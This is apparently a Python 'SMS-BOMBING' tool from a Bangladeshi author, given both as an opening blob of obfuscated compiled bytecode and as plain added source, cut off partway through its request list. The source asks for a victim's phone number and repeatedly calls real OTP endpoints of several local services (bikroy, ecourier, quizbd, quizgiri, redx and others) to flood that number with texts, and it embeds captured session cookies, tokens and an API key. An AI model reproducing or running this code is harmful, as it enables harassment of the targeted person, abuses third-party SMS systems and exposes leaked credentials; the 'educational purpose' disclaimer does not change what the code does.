km5EtrfXNdxquWdbfiH8fjrD6-A8U5mEzFVJLthndQFKwti5ic38rKKpr9DlVhAFG2gzQjHzya6FmfvbdjqzQpF_yDSsQBzej1gMbNjoH2vXK1oDwCtJBaSzG5gNA_Y6Pjsh67Fp0bc5RfmWbhsbN_qXFjfuECGVqRokNnIMB-2gQm-Ej_HsIRsknswuFUG5tjezgFSoIVTh03HQ1f-udy8qjIRjrDdN_cA6z8hCxg580XqAe3AmNMgb_nNQBukK3qCZVLPm4EMMavfjZ9c4EC4SyasjLo3EJvqcOrm-NGukrg8FDFpvcMuwNrl67eP57KNfDMr1YRIKqDz_vN5CtpLldfwaO4D3hJUMa7o3ADJh_vtT-gyEtBAq-mAgEn7nj8dE47DGt8DIl5cF_7b2IUqbFywq6MMXLk1GPTZvbyqKxA_F4LCYCgNWRbsc6FU9ijq3mZmDMaJExEJud2kaDQGqQWyI39NjLZ6DlT7BViFo0306h2puCmE30g4xcL6W5avZkdgTaBUgtqPhyt6kGpjtJoL7CVeGvI0t8Ngv70zv_IUDPJGosbgEkAdkcQNOkCH4m2Oa47cg3DjYNI3tZ8W2sMZSpv-IRWuymugLSHjm2f2PDGSYqJwsV4eBUxhT7MI63A4fvrQrXSpPAfc0nciighyUU2QdeV6BzqODSswBO4Ad_QdYb_KrTpd7KR44ebBH4nSybHMtl38Q81EpF--bLhh0P9YmTLKEPROkCWhU2CWIw-BPZJMXgcVCsWHMRuJbZHxQnwYM0QWYExRvmQ-w9hkNl26HE3OfIWkMBASyPAMUD1GG-zQIib0PXpRGOZ_WfWewOtG4zzkfnwtvYyLXS16XjnmMiU2RZTsK_c9i6_S1fpGkf6fgRrZaBf_OEY1bIH_yu0EMDrkVZYIV_39JijFUj4VMMWlUgEnt9-KZ5_gSGrpCJoyeJlaMTnKL2VVn9jCZ-TcH_ZbLSRcS5jJGZXH7SR16evt88xLQHbD8FbsNxgJpCrWCBxuiuZMYY18tKnY0PROJjroxRz5BS7mfA05Rt3lVH6CBXFeXfQEtrsRiRBTx4tp4df5TxIq07ZjXx-ukkLFrTp0rXwVZ9uwrceh0PKhP--l2bx43broUvSJLfG5O4-Jaw9IFiE15ESVmEusbuUml_Y0K-26jF3xSGpdXFESf8LPTnwb9Zl8Gw_g8nthd9e7f6fZSgobA6dh-cwe1MT7O0ITCG29Er1_StBLoaQX5gfDP3ujLR36uS7DjfD14RSOMOr1DB6OulNt4q4ufsbmgBaHLQ5PaNlM6qVCbKfipbj2g67taoEXVTtMwgHJv_OlJ3owQjHU5KEmHvOSvC8j9SQU6hpMrlIQR0)\x03\xda\x08userType\xda\x08username\xda\x06apiKeyz%https://gw.jotno.net/auth/login/token\xda\nJSESSIONIDz$d1328198-e00c-4fc9-b091-2479d62973d4\xda\x13userActTraSerBrowIdz$c146df39-5590-43fe-b65b-756906cc412b\xda\x13userActTraSerSessIdz$75411431-a07b-48d0-beb1-2ab57e6acf6bz\x181.1.672599153.1754205960\xda\x04_gidz\x1aGA1.2.313656100.1754205962\xda\x04_gatz\x12_gat_UA-28456258-1z%fb.1.1754205963238.190392695153971306\xda\x05_clckz\x1bubuyem%7C2%7Cfy5%7C0%7C2041\xda\x0fnt_req_con_indxz\x10["nt_all_index"]\xda\x0cnt_pop_shownz\x14["nt_all_pop_shown"]\xda\x0ccf_clearancea*\x01\x00\x00Dm6S9bVHLzI1GBXAMK08sk5hYnUym43cnVMW07BvVhk-1754205970-1.2.1.1-xFbKVPgeUOz.iNeYPJ9wv_OwcNyrGwLvUmFzJZMWN.fD5yeSXSylEurLgtkERTHarr0yRcAMcKFEI464vXiBF2c_INEOndcxiBLLW4hwAW.MMA6yp4.I4_iksm_idA4Pv9FumSQ9kQL3tGYXskTB49KreZprSdMT1UBdI8ihgDtdcp.WI.fJuOBjXySrW2MjSehsztFlhB0DNS_xTzmaveNzSeOB788khxiTJd_5Lcs\xda\x06sururl\xda(aHR0cHM6Ly93d3cucm9rb21hcmkuY29tL2xvZ2luz\x1bGA1.2.2047015479.1754205962\xda\x0e_ga_N8S2Z6QJVPz-GS2.1.s1754205961$o1$g1$t1754205978$j43$l0$h0\xda\x05_clskz813xxp1p%7C1754205979228%7C2%7C1%7Ci.clarity.ms%2Fcollectz\x10www.rokomari.comz\x18https://www.rokomari.comz\x1ehttps://www.rokomari.com/login)\rr-\x00\x00\x00r.\x00\x00\x00r/\x00\x00\x00r1\x00\x00\x00r2\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00r\x18\x00\x00\x00r3\x00\x00\x00r5\x00\x00\x00r7\x00\x00\x00r8\x00\x00\x00z\x10x-requested-with\xda\x02BD)\x02\xda\x0cemailOrPhone\xda\x0bcountryCodez!https://www.rokomari.com/otp/send)\x03r\x1a\x00\x00\x00r@\x00\x00\x00r\x1b\x00\x00\x00z\x11api.ajkerdeal.comz.application/json, text/javascript, */*; q=0.01z\x1fhttps://corporate.ajkerdeal.comz https://corporate.ajkerdeal.com/)\x03\xda\rMobileOrEmail\xda\x04Type\xda\nCustomerIdzChttps://api.ajkerdeal.com/recover/retrivepassword/appcustomersignupu/\x00\x00\x00\n\n\n\t\t\x1b[1;33m\xf0\x9f\x94\xa5 SMS Bombing Successful.\x1b[0m\n\n\n)&\xda\x08requests\xda\x03sys\xda\x04time\xda\x02os\xda\x06system\xda\x05sleep\xda\x05print\xda\x05input\xda\x03num\xda\x03len\xda\x07isdigit\xda\nstartswith\xda\x04exit\xda\x0camount_input\xda\x03int\xda\x06amount\xda\x01a\xda\x01i\xda\x06stdout\xda\x05write\xda\x05flush\xda\x04sent\xda\x03get\xda\x0bstatus_code\xda\x01br\x1b\x00\x00\x00r\x1a\x00\x00\x00\xda\x01cr@\x00\x00\x00rA\x00\x00\x00\xda\x04post\xda\x01d\xda\tjson_data\xda\x01e\xda\x01f\xda\x01g\xda\x01h\xda\x01j\xa9\x00\xf3\x00\x00\x00\x00\xda\x08<string>\xda\x08<module>r\x8a\x00\x00\x00\x01\x00\x00\x00sp\t\x00\x00\xf0\x03\x01\x01\x01\xdb\x00\x0f\xdb\x00\n\xdb\x00\x0b\xdb\x00\t\xe0\x00\x02\x87\t\x82\t\x88\'\xd4\x00\x12\xd8\x00\x04\x87\n\x82\n\x881\x84\r\xd9\x00\x05\xf0\x00\x11\x07\x04\xf4\x00\x11\x01\x05\xf1,\x00\x07\x0c\xd0\x0c9\xd3\x06:\x80\x03\xd9\x03\x06\x80s\x838\x88r\x83>\x90c\x97k\x91k\x97m\x91m\xa8\x03\xaf\x0e\xa9\x0e\xb0t\xd7(<\xd1(<\xd8\x04\x08\xe1\x04\t\xd0\n0\xd4\x041\xd8\x04\x07\x87H\x82H\x84J\xf1\x06\x00\x10\x15\xd0\x15O\xd3\x0fP\x80\x0c\xd8\x07\x13\xd7\x07\x1b\xd1\x07\x1b\xd7\x07\x1d\xd1\x07\x1d\xd9\x04\t\xd0\n/\xd4\x040\xd8\x04\x07\x87H\x82H\x84J\xe1\t\x0c\x88\\\xd3\t\x1a\x80\x06\xd8\x03\t\x88A\x83:\x90\x16\x98#\x93\x1c\xd9\x04\t\xd0\nK\xd4\x04L\xd8\x04\x07\x87H\x82H\x84J\xe0\x00\x02\x87\t\x82\t\x88\'\xd4\x00\x12\xe0\x04;\x80\x01\xdb\t\n\x80A\xd8\x04\x07\x87J\x81J\xd7\x04\x14\xd1\x04\x14\x90Q\xd4\x04\x17\xd8\x04\x07\x87J\x81J\xd7\x04\x14\xd1\x04\x14\xd4\x04\x16\xd8\x04\x08\x87J\x82J\x88t\xd6\x04\x14\xf1\x07\x00\n\x0b\xf1\x08\x00\x01\x06\xd0\x06D\xd4\x00E\xd8\x00\x04\x87\n\x82\n\x881\x84\r\xe0\x07\x08\x80\x04\xf0\n\x00\x07\x0b\x88V\x84m\xf0\x06\x00\t\x11\x8f\x0c\x8a\x0c\xd0\x17E\xc0c\xc0U\xd0\x15K\xd3\x08L\x80A\xd8\x07\x08\x87}\x81}\x98\x03\xd3\x07\x1b\xd8\x08\x0c\x90\x01\x89\t\x88\x04\xd9\x08\r\x90\x0e\x98t\x98f\xd0$B\xd0\x0eC\xd4\x08D\xd8\x08\x0c\x8f\n\x8a\n\x901\x8d\r\xe0\x08\x0c\xf0\x08\x00\t\x11\x8f\x0c\x8a\x0c\xd0\x17b\xd0cf\xd0bg\xd0\x15h\xd3\x08i\x80A\xd8\x07\x08\x87}\x81}\x98\x03\xd3\x07\x1b\xd8\x08\x0c\x90\x01\x89\t\x88\x04\xd9\x08\r\x90\x0e\x98t\x98f\xd0$B\xd0\x0eC\xd4\x08D\xd8\x08\x0c\x8f\n\x8a\n\x901\x8d\r\xe0\x08\x0c\xf0\n\x00\x13\x18\xd8\x1b+\xd8\x16"\xd8\x12+\xd8\x13-\xd8\x1a!\xd8\x1a \xd8\x1a%\xf0\x02\x00\x17H\x02\xd8\x15?\xd8\x1c \xd8\x1e)\xf1\x19\r\x0f\x06\x80G\xf0 \x00\t\x11\x90#\xf0\x03\x02\x0e\x06\x80F\xf0\x08\x00\t\x11\x8f\x0c\x8a\x0c\xd0\x15U\xd0^d\xd0nu\xd1\x08v\x80A\xd8\x07\x08\x87}\x81}\x98\x03\xd3\x07\x1b\xd8\x08\x0c\x90\x01\x89\t\x88\x04\xd9\x08\r\x90\x0e\x98t\x98f\xd0$B\xd0\x0eC\xd4\x08D\xd8\x08\x0c\x8f\n\x8a\n\x901\x8d\r\xe0\x08\x0c\xf0\x08\x12\x0f\x06\xd8\x08\x11\xd0\x131\xf0\x03\x12\x0f\x06\xe0\x08\x11\xd0\x13.\xf0\x05\x12\x0f\x06\xf0\x06\x00\t\x0e\xd0\x0f+\xf0\x07\x12\x0f\x06\xf0\x08\x00\t\x1c\x98S\xf0\t\x12\x0f\x06\xf0\n\x00\t\x0f\xd0\x102\xf0\x0b\x12\x0f\x06\xf0\x0c\x00\t\x0f\xd0\x107\xf0\r\x12\x0f\x06\xf0\x0e\x00\t&\xd0\'\\\xf0\x0f\x12\x0f\x06\xf0\x10\x00\t&\xd0\'\\\xf0\x11\x12\x0f\x06\xf0\x12\x00\t&\xd0\'\\\xf0\x13\x12\x0f\x06\xf0\x14\x00\t\x19\xd0\x1aI\xf0\x15\x12\x0f\x06\xf0\x16\x00\t\x12\xd0\x13[\xf0\x17\x12\x0f\x06\xf0\x18\x00\t\x15\xf0\x00\x00\x17o\x05\xf0\x19\x12\x0f\x06\xf0\x1a\x00\t\x19\xf0\x00\x00\x1bs\x05\xf0\x1b\x12\x0f\x06\xf0\x1c\x00\t\x11\xd0\x12G\xf0\x1d\x12\x0f\x06\xf0\x1e\x00\t&\xd0\'\\\xf0\x1f\x12\x0f\x06\xf0 \x00\t&\xd0\'\\\xf0!\x12\x0f\x06\xf0"\x00\t\x19\xd0\x1aI\xf0#\x12\x0f\x06\x80G\xf0(\x12\x0f\x06\xd8\x08\x13\xd0\x15%\xf0\x03\x12\x0f\x06\xe0\x08\x10\xf0\x00\x00\x13\\\x02\xf0\x05\x12\x0f\x06\xf0\x06\x00\t\x1a\xd0\x1b+\xf0\x07\x12\x0f\x06\xf0\x08\x00\t\x18\x98\x1b\xf0\t\x12\x0f\x06\xf0\n\x00\t\x17\xd0\x18;\xf0\x0b\x12\x0f\x06\xf0\x0e\x00\t\x11\xd0\x12*\xf0\x0f\x12\x0f\x06\xf0\x10\x00\t\x12\xf0\x00\x00\x14`\x02\xf0\x11\x12\x0f\x06\xf0\x12\x00\t\x14\xd0\x15?\xf0\x13\x12\x0f\x06\xf0\x14\x00\t\x1b\x98D\xf0\x15\x12\x0f\x06\xf0\x16\x00\t\x1d\x98k\xf0\x17\x12\x0f\x06\xf0\x18\x00\t\x19\x98*\xf0\x19\x12\x0f\x06\xf0\x1a\x00\t\x19\x98*\xf0\x1b\x12\x0f\x06\xf0\x1c\x00\t\x19\x98-\xf0\x1d\x12\x0f\x06\xf0\x1e\x00\t\x19\x98$\xf0\x1f\x12\x0f\x06\xf0 \x00\t$\xa0S\xf0!\x12\x0f\x06\xf0"\x00\t\x15\xf0\x00\x00\x17H\x02\xf0#\x12\x0f\x06\x80G\xf0*\x00\x13=\xd8\x14\x1a\xd8\x14\x16\xd8\x16\x19\xf1\t\x05\x0c\x06\x80D\xf0\x0e\x00\t\x11\x8f\r\x8a\r\xd0\x167\xc0\x17\xd0RY\xd0`d\xd1\x08e\x80A\xd8\x07\x08\x87}\x81}\x98\x03\xd3\x07\x1b\xd8\x08\x0c\x90\x01\x89\t\x88\x04\xd9\x08\r\x90\x0e\x98t\x98f\xd0$B\xd0\x0eC\xd4\x08D\xd8\x08\x0c\x8f\n\x8a\n\x901\x8d\r\xe0\x08\x0c\xf0\n\x00\x13\x18\xd8\x1b+\xd8\x16"\xd8\x189\xd8\x12/\xd8\x131\xd8\x1a!\xd8\x1a \xd8\x1a&\xf0\x02\x00\x17H\x02\xd8\x1c,\xd8\x15?\xd8\x1c \xd8\x1e)\xd8\x157\xf1\x1f\x10\x0f\x06\x80G\xf0&\x00\x12\x15\xd8\x18\x1d\xd8\x15\x19\xf1\x07\x04\x11\x06\x80I\xf0\x0c\x00\t\x11\x8f\r\x8a\r\xd0\x16H\xd0RY\xd0`i\xd1\x08j\x80A\xd8\x07\x08\x87}\x81}\x98\x03\xd3\x07\x1b\xd8\x08\x0c\x90\x01\x89\t\x88\x04\xd9\x08\r\x90\x0e\x98t\x98f\xd0$B\xd0\x0eC\xd4\x08D\xd8\x08\x0c\x8f\n\x8a\n\x901\x8d\r\xe0\x08\x0c\xf0\n\x00\x10-\xd8\x107\xd8\x13.\xd8\x1aI\xd8\x1aI\xf1\x0b\x06\x0f\x06\x80G\xf0\x12\x00\x16\'\xd8\x125\xd8\x1b+\xd8\x18*\xe0\x12\'\xd8\x13)\xd8\x15?\xd8\x1c \xd8\x1e)\xd8\x1a!\xd8\x1a \xd8\x1a%\xf0\x02\x00\x17H\x02\xf1\x1d\x0f\x0f\x06\x80G\xf0$\x00\t\x16\x90s\xf0\x03\x02\x11\x06\x80I\xf0\x08\x00\t\x11\x8f\r\x8a\r\xd0\x16b\xd8\x10\x17\xd8\x10\x17\xd8\r\x16\xf1\x07\x04\t\x06\x80A\xf0\n\x00\x08\t\x87}\x81}\x98\x03\xd3\x07\x1b\xd8\x08\x0c\x90\x01\x89\t\x88\x04\xd9\x08\r\x90\x0e\x98t\x98f\xd0$B\xd0\x0eC\xd4\x08D\xd8\x08\x0c\x8f\n\x8a\n\x901\x8d\r\xe0\x08\x0c\xf0\x08\x00\x0c\x0f\x8f>\x89>\x98%\xd7\x0b \xd1\x0b \xd8\x0e\x13\x90c\x89k\x88\x03\xf0\x06\x00\x16,\xd8\x12\x17\xd8\x1b+\xd8\x18*\xd8\x12*\xd8\x13,\xd8\x15?\xd8\x1c \xd8\x1e)\xd8\x1a!\xd8\x1a \xd8\x1a&\xf0\x02\x00\x17H\x02\xf1\x1b\x0e\x0f\x06\x80G\xf0"\x00\t\x16\x90s\xf0\x03\x02\x11\x06\x80I\xf0\x08\x00\t\x11\x8f\r\x8a\r\xd0\x16Z\xd0dk\xd0r{\xd1\x08|\x80A\xd8\x07\x08\x87}\x81}\x98\x03\xd3\x07\x1b\xd8\x08\x0c\x90\x01\x89\t\x88\x04\xd9\x08\r\x90\x0e\x98t\x98f\xd0$B\xd0\x0eC\xd4\x08D\xd8\x08\x0c\x8f\n\x8a\n\x901\x8d\r\xe0\x08\x0c\xf0\n\x00\x13U\x03\xf0\x02\x00\x17Y\x03\xf1\x05\x03\x0f\x06\x80G\xf0\x0c\x00\x16$\xd8\x125\xd8\x1b+\xd8\x18*\xe0\x12)\xd8\x13+\xd8\x15?\xd8\x1c \xd8\x1e)\xd8\x1a!\xd8\x1a \xd8\x1a%\xf0\x02\x00\x17H\x02\xd8\x1c!\xf1\x1f\x10\x0f\x06\x80G\xf0&\x00\x15\x1f\xd8\x14\x17\xf0\x02\x00\x13c"\xf1\x07\x04\x11\x06\x80I\xf0\x0c\x00\t\x11\x8f\r\x8a\r\xd0\x16=\xc0w\xd0X_\xd0fo\xd1\x08p\x80A\xd8\x07\x08\x87}\x81}\x98\x03\xd3\x07\x1b\xd8\x08\x0c\x90\x01\x89\t\x88\x04\xd9\x08\r\x90\x0e\x98t\x98f\xd0$B\xd0\x0eC\xd4\x08D\xd8\x08\x0c\x8f\n\x8a\n\x901\x8d\r\xe0\x08\x0c\xf0\x08\x00\x0c\x0f\x8f>\x89>\x98%\xd7\x0b \xd1\x0b \xd8\x0e\x13\x90c\x89k\x88\x03\xf0\x02\x11\x13\n\xd8\x0c\x18\xd0\x1a@\xf0\x03\x11\x13\n\xe0\x0c!\xd0#I\xf0\x05\x11\x13\n\xf0\x06\x00\r"\xd0#I\xf0\x07\x11\x13\n\xf0\x08\x00\r\x16\xd0\x171\xf0\t\x11\x13\n\xf0\n\x00\r\x13\xd0\x140\xf0\x0b\x11\x13\n\xf0\x0c\x00\r\x13\x90C\xf0\r\x11\x13\n\xf0\x0e\x00\r!\xa0#\xf0\x0f\x11\x13\n\xf0\x10\x00\r\x13\xd0\x14;\xf0\x11\x11\x13\n\xf0\x12\x00\r\x14\xd0\x152\xf0\x13\x11\x13\n\xf0\x14\x00\r\x1e\xd0\x1f1\xf0\x15\x11\x13\n\xf0\x16\x00\r\x1b\xd0\x1c2\xf0\x17\x11\x13\n\xf0\x18\x00\r\x1b\xf0\x00\x00\x1dI\x05\xf0\x19\x11\x13\n\xf0\x1a\x00\r\x15\xd0\x16@\xf0\x1b\x11\x13\n\xf0\x1c\x00\r\x12\xd0\x130\xf0\x1d\x11\x13\n\xf0\x1e\x00\r\x1d\xd0\x1eM\xf0\x1f\x11\x13\n\xf0 \x00\r\x14\xd0\x15O\xf0!\x11\x13\n\x88\x07\xf0(\x00\x1a,\xd8\x16\x1b\xd8\x1f/\xe0\x160\xd8\x177\xd8\x19C\xd8 $\xd8"-\xd8\x1e%\xd8\x1e$\xd8\x1e+\xf0\x02\x00\x1bL\x02\xd8 0\xf1\x1d\x0f\x0f\n\x80G\xf0$\x00\x1d \xd8\x1b\x1f\xf1\x05\x03\x0e\n\x80F\xf0\n\x00\t\x11\x8f\r\x8a\r\xd0\x169\xc0&\xd0RY\xd0cj\xd1\x08k\x80A\xd8\x07\x08\x87}\x81}\x98\x03\xd3\x07\x1b\xd8\x08\x0c\x90\x01\x89\t\x88\x04\xd9\x08\r\x90\x0e\x98t\x98f\xd0$B\xd0\x0eC\xd4\x08D\xd8\x08\x0c\x8f\n\x8a\n\x901\x8d\r\xe0\x08\x0c\xf0\n\x00\x16)\xd8\x12B\xd8\x1b+\xd8\x18*\xd8\x123\xd8\x135\xd8\x15?\xd8\x1c \xd8\x1e)\xd8\x1a!\xd8\x1a \xd8\x1a%\xf0\x02\x00\x17H\x02\xf1\x1b\x0e\x0f\x06\x80G\xf0"\x00\x1a\x1d\xd8\x10\x11\xd8\x16\x1a\xf1\x07\x04\x11\x06\x80I\xf0\x0c\x00\t\x11\x8f\r\x8a\r\xd0\x16[\xd0el\xd0s|\xd1\x08}\x80A\xd8\x07\x08\x87}\x81}\x98\x03\xd3\x07\x1b\xd8\x08\x0c\x90\x01\x89\t\x88\x04\xd9\x08\r\x90\x0e\x98t\x98f\xd0$B\xd0\x0eC\xd4\x08D\xd8\x08\x0c\x8f\n\x8a\n\x901\x8d\r\xe0\x08\x0c\xf0g\n\x00\x07\x0b\x88V\x86m\xf0n\n\x00\x05D\x01\x80\x01\xdb\t\n\x80A\xd8\x04\x07\x87J\x81J\xd7\x04\x14\xd1\x04\x14\x90Q\xd4\x04\x17\xd8\x04\x07\x87J\x81J\xd7\x04\x14\xd1\x04\x14\xd4\x04\x16\xd8\x04\x08\x87J\x82J\x88t\xd6\x04\x14\xf2\x07\x00\n\x0br\x88\x00\x00\x00'))
+import requests
+import sys
+import time
+import os
+
+os.system("clear")
+time.sleep(2)
+print("""\033[1;32m
+
+
+
+  ___ __  __ ___     ___  ___  __  __ ___ ___ _  _  ___ 
+ / __|  \\/  / __|___| _ )/ _ \\|  \\/  | _ |_ _| \\| |/ __|
+ \\__ | |\\/| \\__ |___| _ | (_) | |\\/| | _ \\| || .` | (_ |
+ |___|_|  |_|___/   |___/\\___/|_|  |_|___|___|_|\\_|\\___|
+                                      
+
+\t\t\033[1;33m⚠️ Warning!\n\033[1;31mThis tool is only made for Educational Purpose. Misuse of this tool can be trigger the Cyber System. We do not support any type of Hacking or Phishing and the developer will not responsible for any misuse of this tool. Stay in Ethic. ✅\033[0m"                                                                                                                                                   \033[1;36m
+————————————————————————————————————————————————————————————————————————————————
+\033[1;34mTools Author: \033[1;33mMohammad Rayhan Khan
+\033[1;34mVersion: \033[1;33m1.0
+\033[1;34mTool Name: \033[1;33mSMS-BOMBING
+\033[1;34mGithub: \033[1;33mhttps://github.com/lucifer-fernandez/SMS-BOMB.git
+\033[1;36m————————————————————————————————————————————————————————————————————————————————
+""")
+
+
+
+
+num = input("\033[1;36mEnter your Target Number:\033[0m ")
+if len(num) == 11 and num.isdigit() and num.startswith('01'):
+    pass
+else:
+    print("\033[1;31m❌ Invalid Number!\033[0m")
+    sys.exit()
+
+
+amount_input = input("\033[1;36mEnter your SMS amount between (1-100):\033[0m ")
+if not amount_input.isdigit():
+    print("\033[1;31m❌ Invalid input!\033[0m")
+    sys.exit()
+
+amount = int(amount_input)
+if amount < 1 or amount > 100:
+    print("\033[1;31m❌ Invalid amount! Must be between 1 and 100.\033[0m")
+    sys.exit()
+
+os.system("clear")
+
+a = "\n\n\n\t\t\033[1;33m💣 Bombing Started...!\033[0m\n"
+for i in a:
+    sys.stdout.write(i)
+    sys.stdout.flush()
+    time.sleep(0.09)
+print("\n\t\033[1;34mPress Control+Z for stop Bombing.\033[0m\n\n\n")
+time.sleep(3)
+
+sent = 0
+
+    
+    
+
+while sent < amount:
+ 
+    # iqra-live
+    a = requests.get(f'https://apibeta.iqra-live.com/api/v2/sent-otp/{num}')
+    if a.status_code == 200:
+        sent += 1
+        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
+        time.sleep(1)
+    else:
+        pass
+
+
+    # bikroy.com
+    b = requests.get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}')
+    if b.status_code == 200:
+        sent += 1
+        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
+        time.sleep(1)
+    else:
+        pass
+
+                
+    # e-courier
+    headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Connection': 'keep-alive',
+        'Origin': 'https://ecourier.com.bd',
+        'Referer': 'https://ecourier.com.bd/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+    }
+    
+    params = {
+        'mobile': num,
+    }
+    
+    c = requests.get('https://backoffice.ecourier.com.bd/api/web/individual-send-otp', params=params, headers=headers)
+    if c.status_code == 200:
+        sent += 1
+        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
+        time.sleep(1)
+    else:
+        pass
+
+        
+    # quizbd
+    cookies = {
+        '_gcl_gs': '2.1.k5$i1754139607$u36406433',
+        '_gcl_au': '1.1.1053490129.1754139612',
+        '_ga': 'GA1.1.466660647.1754139613',
+        '_tt_enable_cookie': '1',
+        '_ttp': '01K1NDWPS08RH3HK16SGCV6Z4H_.tt.1',
+        '_fbp': 'fb.1.1754139614479.845709771715957314',
+        'ttcsid_COSTTJJC77U1Q2BAH980': '1754146481721::XjilHizjYwtDZqJQRnCN.2.1754146482284',
+        'ttcsid_CPEM4I3C77UBKGA90VN0': '1754146481738::lJsEmhO1EvOc0xcThKjo.2.1754146482286',
+        'ttcsid_CTR76TRC77U1GH2BI2V0': '1754146481746::dN_FtsdpMVyvBNdlsD9Y.2.1754146482288',
+        '_ga_J177DW73V3': 'GS2.1.s1754146480$o2$g0$t1754146485$j55$l0$h0',
+        '_gcl_aw': 'GCL.1754146488.EAIaIQobChMI2deH05bsjgMV6TZUCR2aOyhpEAEYASAAEgI-5vD_BwE',
+        'XSRF-TOKEN': 'eyJpdiI6ImpBNElEVy81VWdOV2J6SnJmRk83cXc9PSIsInZhbHVlIjoiaEd0NmZCNDdXVkt3OE1XRS9EdDkyV1liYWo0SXRzSDRPUjVxcXl5MjV6SklBYnBvWUU5dU81TlpFUVViN0VSRVh4R0ZDU2p1aDRFZjhublhNMVc3cWJLWmdldU9ML2xCa295aEFwU1pUaW9ROFc2b0s4bi9GSlFseHJsancwWnUiLCJtYWMiOiI2MDA1YTcwNWFmNTk2YTc4MDUyZWM4YWY4ZTgzYTJmM2YwMmJjMzcxM2EzMWU3MDZhODFmODU3MWNkMzMwZDMwIiwidGFnIjoiIn0%3D',
+        'quizbd_session': 'eyJpdiI6InozNGRDem9QSkp0Q2N0RmN1OWpNS2c9PSIsInZhbHVlIjoiMVpNdllmTDVyMGZ0S2NLRzVtSGIwcHRIMnVZUU9kTDVnb0FUaE9hd3JlbFdOMGwvYnFxQkVCOGJoLzRkbWVWcXhpZTY5MXVjMk85VllWcE9Ib29sMzBONjVPajhUWXZNZEJtT3hwQ2VwS1lUNjlrRnBGT0ljRmd4aDUzeGZZMEYiLCJtYWMiOiJlM2M2MTE4NjE4Mzk4YWYwNjYwZTllNzg4YTQ4ODg5ZDE5OWYxNDBjMWJmNGEyNDRmZjY1YTY4NDJlZjE5NGIyIiwidGFnIjoiIn0%3D',
+        'ttcsid': '1754146481727::Jugp3IwwV0l78ZAKMrVb.2.1754146501483',
+        'ttcsid_CPK02KJC77U57258L9A0': '1754146487606::2ePqBt0LuVMUVkZim0Lf.2.1754146501750',
+        'ttcsid_CR7CT4RC77U5L7EOR4FG': '1754146487613::5Mz94VWbRcYyp-k5VzIN.2.1754146501751',
+        '_ga_4CKNNTBZW6': 'GS2.1.s1754146487$o2$g0$t1754146502$j45$l0$h0',
+    }
+    
+    headers = {
+        'authority': 'pay.quizbd.app',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
+        'cache-control': 'max-age=0',
+        'content-type': 'application/x-www-form-urlencoded',
+    
+        'origin': 'https://pay.quizbd.app',
+        'referer': 'https://pay.quizbd.app/buy-pack/1025?gad_source=5&gad_campaignid=22843081087&gclid=EAIaIQobChMI2deH05bsjgMV6TZUCR2aOyhpEAEYASAAEgI-5vD_BwE',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
+    
+    data = {
+        '_token': '4kyvvDVDl6zsTWiuKREy4orb6OyofyV7RHF4m7ik',
+        'bundleId': '1025',
+        'campaign': '',
+        'userNumber': num,
+    }
+    
+    d = requests.post('https://pay.quizbd.app/send-otp', cookies=cookies, headers=headers, data=data)
+    if d.status_code == 200:
+        sent += 1
+        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
+        time.sleep(1)
+    else:
+        pass
+
+                
+    # quizgiri    
+    headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Connection': 'keep-alive',
+        'Content-type': 'application/json; charset=utf-8',
+        'Origin': 'https://app.quizgiri.com.bd',
+        'Referer': 'https://app.quizgiri.com.bd/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'cross-site',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'x-api-key': 'gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G',
+    }
+    
+    json_data = {
+        'phone': num,
+        'country_code': '+88',
+        'fcm_token': None,
+    }
+    
+    e = requests.post('https://developer.quizgiri.xyz/api/v2.0/send-otp', headers=headers, json=json_data)
+    if e.status_code == 200:
+        sent += 1
+        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
+        time.sleep(1)
+    else:
+        pass
+    
+            
+    # redx
+    cookies = {
+        '_ga': 'GA1.1.1007807516.1754153780',
+        '_fbp': 'fb.2.1754153780093.834494875177130484',
+        '_gcl_au': '1.1.1444896708.1754153781',
+        '_ga_ZTN98XM7BX': 'GS2.1.s1754153781$o1$g1$t1754153826$j15$l0$h0',
+        '_ga_DVN5RVT5NY': 'GS2.1.s1754153779$o1$g1$t1754153829$j10$l0$h0',
+    }
+    
+    headers = {
+        'authority': 'api.redx.com.bd',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/json',
+    
+        'origin': 'https://redx.com.bd',
+        'referer': 'https://redx.com.bd/',
